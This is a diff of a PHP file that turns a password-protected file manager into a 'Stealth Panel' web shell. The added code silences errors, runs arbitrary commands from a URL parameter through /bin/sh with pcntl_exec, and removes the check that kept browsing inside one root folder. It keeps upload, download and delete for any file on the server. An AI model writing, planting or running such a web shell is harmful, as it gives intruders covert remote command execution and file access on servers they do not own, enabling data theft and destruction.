@@ -1,145 +1,155 @@
 <?php
-// ================== CONFIG ==================
-$password = "wiredmouseis";
-$title = "Storage";
-$mainDir = __DIR__; // You can set this to any root folder you want
-// ============================================
-
+error_reporting(0);
 session_start();
 
-// AUTHENTICATION
-if (!isset($_SESSION['auth']) && (!isset($_POST['pass']) || $_POST['pass'] !== $password)) {
-    die('
-    <html><head><title>'.$title.'</title>
+$password = "wiredmouseis";  
+
+// Password Check
+if (!isset($_SESSION['auth'])) {
+    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
+        $_SESSION['auth'] = true;
+    } else {
+        die('<html><head><title>Access</title><style>body{background:#000;color:#0f0;font-family:Consolas;text-align:center;padding-top:80px;}</style></head><body>
+        <h2>Enter Password</h2>
+        <form method="post"><input type="password" name="pass" style="background:#111;border:1px solid #0f0;color:#0f0;padding:12px;width:280px;" autofocus></form>
+        </body></html>');
+    }
+}
+
+// Current Directory
+$dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
+if (!is_dir($dir)) $dir = getcwd();
+chdir($dir);
+
+$cmd = $_GET['c'] ?? '';
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Stealth Panel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
-    body{background:#0f0f0f;color:#0f0;font-family:Consolas;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;}
-    input{background:#1a1a1a;border:1px solid #0f0;color:#0f0;padding:15px;width:280px;text-align:center;}
-    </style></head>
-    <body>
-    <form method="post"><input type="password" name="pass" placeholder="Enter Access Code" autofocus></form>
-    </body></html>');
-}
-$_SESSION['auth'] = true;
+        body { background:#0a0a0a; color:#e0e0e0; font-family:Consolas, monospace; margin:0; padding:0; }
+        .header { background:#111; padding:15px; display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid #0f0; }
+        .path { color:#0f0; word-break:break-all; }
+        table { width:100%; border-collapse:collapse; }
+        th, td { padding:10px 12px; border-bottom:1px solid #222; }
+        tr:hover { background:#1a1a1a; }
+        .folder { color:#4fc3f7; }
+        .file { color:#81c784; }
+        input[type=text] { width:75%; padding:12px; background:#111; border:1px solid #0f0; color:#0f0; }
+        button { padding:12px 20px; background:#111; border:1px solid #0f0; color:#0f0; cursor:pointer; }
+        .output { background:#000; padding:15px; margin:10px 0; white-space:pre-wrap; border:1px solid #222; }
+    </style>
+</head>
+<body>
 
-// LOGOUT
-if (isset($_GET['logout'])) {
-    session_destroy();
-    header("Location: " . $_SERVER['PHP_SELF']);
-    exit;
-}
+<div class="header">
+    <h2><i class="fas fa-server"></i> Stealth Panel</h2>
+    <a href="?logout=1" style="color:#f66;">Logout</a>
+</div>
 
-// DIRECTORY NAVIGATION
-$dir = isset($_GET['d']) ? $_GET['d'] : $mainDir;
+<div style="padding:15px;">
 
-// Resolve and prevent escaping mainDir
-$realDir = realpath($dir);
-if (!$realDir || strpos($realDir, realpath($mainDir)) !== 0) {
-    $realDir = $mainDir; // fallback to mainDir if trying to escape
-}
-chdir($realDir);
+    <!-- Command Shell -->
+    <h3>⚡ Command Shell</h3>
+    <form method="GET">
+        <input type="text" name="c" placeholder="id || whoami || ls -la || uname -a" autofocus>
+        <button type="submit">Run</button>
+    </form>
 
-// DOWNLOAD HANDLER (must be before any HTML output)
-if (isset($_GET['download'])) {
-    $file = $realDir . '/' . $_GET['download'];
-    if (file_exists($file) && is_file($file)) {
-        header('Content-Description: File Transfer');
+    <?php if($cmd): ?>
+    <div class="output">
+        <b>Command:</b> <?=htmlspecialchars($cmd)?><br><br>
+        <?php
+        $out = '/tmp/out_'.rand(10000,99999).'.txt';
+        if(function_exists('pcntl_fork') && function_exists('pcntl_exec')){
+            $pid = pcntl_fork();
+            if($pid == 0){
+                pcntl_exec('/bin/sh', ['-c', $cmd . " > $out 2>&1"]);
+                exit();
+            }
+            sleep(2);
+        }
+        $result = file_exists($out) ? file_get_contents($out) : '';
+        @unlink($out);
+
+        echo htmlspecialchars($result ?: "No output");
+        ?>
+    </div>
+    <?php endif; ?>
+
+    <!-- File Manager -->
+    <h3>📁 File Manager - <?=htmlspecialchars(basename($dir))?></h3>
+    <div class="path"><b>Path:</b> <?=htmlspecialchars($dir)?></div>
+
+    <!-- Upload -->
+    <form method="post" enctype="multipart/form-data" style="margin:15px 0;">
+        <input type="file" name="ufile">
+        <button type="submit">Upload</button>
+    </form>
+
+    <?php
+    // Upload
+    if(isset($_FILES['ufile'])){
+        $target = $dir . '/' . basename($_FILES['ufile']['name']);
+        if(move_uploaded_file($_FILES['ufile']['tmp_name'], $target)){
+            echo "<p style='color:lime;'>✓ Uploaded Successfully</p>";
+        } else {
+            echo "<p style='color:red;'>✗ Upload Failed</p>";
+        }
+    }
+
+    // Delete
+    if(isset($_GET['del'])){
+        $delpath = $dir.'/'.$_GET['del'];
+        if(is_file($delpath)) unlink($delpath);
+        elseif(is_dir($delpath)) @rmdir($delpath);
+        header("Location: ?d=".urlencode($dir));
+    }
+    ?>
+
+    <table>
+        <tr><th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr>
+        <?php
+        $files = scandir($dir);
+        foreach($files as $f){
+            if($f == "." || $f == "..") continue;
+            $full = $dir.'/'.$f;
+            $isDir = is_dir($full);
+            echo "<tr>";
+            echo "<td>";
+            if($isDir){
+                echo '<a href="?d='.urlencode($full).'" class="folder"><i class="fas fa-folder"></i> '.$f.'</a>';
+            } else {
+                echo '<a href="?d='.urlencode($dir).'&download='.urlencode($f).'" class="file"><i class="fas fa-file"></i> '.$f.'</a>';
+            }
+            echo "</td>";
+            echo "<td>".($isDir ? 'Folder' : pathinfo($f,PATHINFO_EXTENSION))."</td>";
+            echo "<td>".($isDir ? '-' : round(filesize($full)/1024,2).' KB')."</td>";
+            echo "<td>".(!$isDir ? '<a href="?del='.urlencode($f).'&d='.urlencode($dir).'" style="color:#f66;">Delete</a>' : '')."</td>";
+            echo "</tr>";
+        }
+        ?>
+    </table>
+</div>
+
+<?php
+// Download
+if(isset($_GET['download'])){
+    $file = $dir.'/'.$_GET['download'];
+    if(file_exists($file)){
         header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        header('Content-Disposition: attachment; filename="'.basename($file).'"');
         readfile($file);
         exit;
     }
 }
 
-// DELETE HANDLER
-if (isset($_GET['del'])) {
-    $delpath = $realDir . '/' . $_GET['del'];
-    if (is_file($delpath)) unlink($delpath);
-    elseif (is_dir($delpath)) rmdir($delpath);
-    header("Location: ?d=" . urlencode($realDir));
-    exit;
-}
-
-// FILES LIST
-$files = scandir($realDir);
-
-// UPLOAD HANDLER
-if (isset($_FILES['uploadfile'])) {
-    $target = $realDir . '/' . basename($_FILES['uploadfile']['name']);
-    if (move_uploaded_file($_FILES['uploadfile']['tmp_name'], $target)) {
-        $msg = "<p style='color:#4caf50;text-align:center;'>✓ Uploaded successfully</p>";
-    } else {
-        $msg = "<p style='color:#f66;text-align:center;'>✗ Upload failed</p>";
-    }
-}
+// Logout
+if(isset($_GET['logout'])){ session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); }
 ?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title><?= $title ?> • <?= basename($realDir) ?></title>
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
-<style>
-body { background:#0a0a0a; color:#e0e0e0; font-family:'Segoe UI',sans-serif; margin:0; padding:0; }
-.header { background:#111; padding:15px 20px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #222; }
-.path { color:#0f0; word-break:break-all; }
-table { width:100%; border-collapse:collapse; }
-th, td { padding:10px 12px; text-align:left; border-bottom:1px solid #222; }
-tr:hover { background:#1a1a1a; }
-.folder { color:#4fc3f7; }
-.file { color:#81c784; }
-.upload-box { background:#111; padding:20px; border:2px dashed #333; text-align:center; margin:15px; border-radius:8px; }
-a { color:#0f0; text-decoration:none; }
-a:hover { color:#4caf50; }
-.btn { padding:8px 14px; background:#1f1f1f; border:1px solid #333; color:#0f0; border-radius:4px; cursor:pointer; }
-</style>
-</head>
-<body>
-
-<div class="header">
-    <h2><i class="fas fa-folder-open"></i> <?= $title ?> <small style="color:#666;">- <?= basename($realDir) ?></small></h2>
-    <a href="?logout=1" style="color:#f66;">Logout</a>
-</div>
-
-<div style="padding:15px;">
-    <div class="path"><strong>Path:</strong> <?= htmlspecialchars($realDir) ?></div>
-
-    <!-- Upload Form -->
-    <div class="upload-box">
-        <form action="" method="post" enctype="multipart/form-data">
-            <input type="file" name="uploadfile" style="color:#aaa;">
-            <input type="submit" value="Upload File" class="btn">
-        </form>
-    </div>
-
-    <?= $msg ?? '' ?>
-
-    <table>
-        <tr><th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr>
-        <?php foreach($files as $file):
-            if($file == "." || $file == "..") continue;
-            $fullpath = $realDir . '/' . $file;
-            $isDir = is_dir($fullpath);
-        ?>
-        <tr>
-            <td>
-                <?php if($isDir): ?>
-                    <a href="?d=<?= urlencode($fullpath) ?>" class="folder"><i class="fas fa-folder"></i> <?= htmlspecialchars($file) ?></a>
-                <?php else: ?>
-                    <a href="?d=<?= urlencode($realDir) ?>&download=<?= urlencode($file) ?>" class="file"><i class="fas fa-file"></i> <?= htmlspecialchars($file) ?></a>
-                <?php endif; ?>
-            </td>
-            <td><?= $isDir ? 'Folder' : pathinfo($file, PATHINFO_EXTENSION) ?></td>
-            <td><?= $isDir ? '-' : round(filesize($fullpath)/1024, 2) . ' KB' ?></td>
-            <td>
-                <?php if(!$isDir): ?>
-                    <a href="?del=<?= urlencode($file) ?>&d=<?= urlencode($realDir) ?>" onclick="return confirm('Delete?')" style="color:#f66;">Delete</a>
-                <?php endif; ?>
-            </td>
-        </tr>
-        <?php endforeach; ?>
-    </table>
-</div>
-
 </body>
 </html>
